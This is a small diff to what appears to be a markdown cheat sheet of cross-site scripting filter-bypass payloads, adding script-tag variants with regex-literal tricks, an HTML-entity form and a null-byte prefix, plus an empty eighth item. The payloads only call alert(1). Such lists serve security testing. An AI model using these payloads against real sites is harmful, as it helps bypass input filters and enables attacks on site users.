@@ -172,6 +172,13 @@ Try to use this payloads :
 
 5) <script>prompt(1)</script>
 
+6) <script>/&/-alert(1)</script>
+<script>/&amp;/-alert(1)</script>
+
+7) %00%00%00%00%00%00%00<script>alert(1)</script>
+
+8) 
+
 ```
 
 ### 4.If space is encoded or deleted
